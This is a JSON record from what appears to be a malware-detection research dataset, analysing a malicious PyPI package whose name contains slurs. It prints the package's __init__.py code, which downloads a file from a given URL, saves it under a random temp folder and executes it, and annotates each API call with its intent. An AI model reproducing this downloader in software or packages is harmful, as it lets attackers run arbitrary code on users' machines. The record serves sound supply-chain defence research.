{
  "metadata": {
    "package_name": "httpgayasfunigga-4",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/httpgayasfunigga-4.4.9-py3-none-any.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/httpgayasfunigga-4.4.9-py3-none-any/pyepkg/__init__.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport tempfile\nimport requests\nimport string\nimport random\nimport subprocess\n\ndef generate_random(length=8):\n    chars = string.ascii_lowercase + string.digits\n    return ''.join(random.choice(chars) for _ in range(length))\n\ndef init(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        temp_folder = tempfile.gettempdir()\n        folder_name = generate_random()\n        folder_path = os.path.join(temp_folder, folder_name)\n        os.makedirs(folder_path, exist_ok=True)\n\n        file_name = os.path.basename(url)\n        file_path = os.path.join(folder_path, file_name)\n\n        with open(file_path, 'wb') as file:\n            file.write(response.content)\n\n        subprocess.run([file_path])",
          "triple_sequences": [
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "url",
              "object_description": "URL string",
              "object_id": "url_string",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "tempfile.gettempdir()",
              "action_description": "Creates temporary directory and returns its path",
              "action_id": "create_temp_dir",
              "object": "",
              "object_description": "Temporary directory",
              "object_id": "temporary_directory",
              "intention_description": "Collect temporary directory path",
              "intention_id": "collect_temp_directory_path"
            },
            {
              "action_api": "generate_random()",
              "action_description": "Generate random string",
              "action_id": "generate_random_integer",
              "object": "length=8",
              "object_description": "Random string",
              "object_id": "random_string",
              "intention_description": "Create random file name",
              "intention_id": "create_random_filename"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "temp_folder, folder_name",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "os.makedirs()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "folder_path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "os.path.basename()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "url",
              "object_description": "Path segment",
              "object_id": "path_segment",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "folder_path, file_name",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "file_path, 'wb'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "response.content",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "subprocess.run()",
              "action_description": "Spawns new process to execute command without shell access",
              "action_id": "spawn_process_no_shell",
              "object": "[file_path]",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            }
          ]
        }
      ]
    }
  ]
}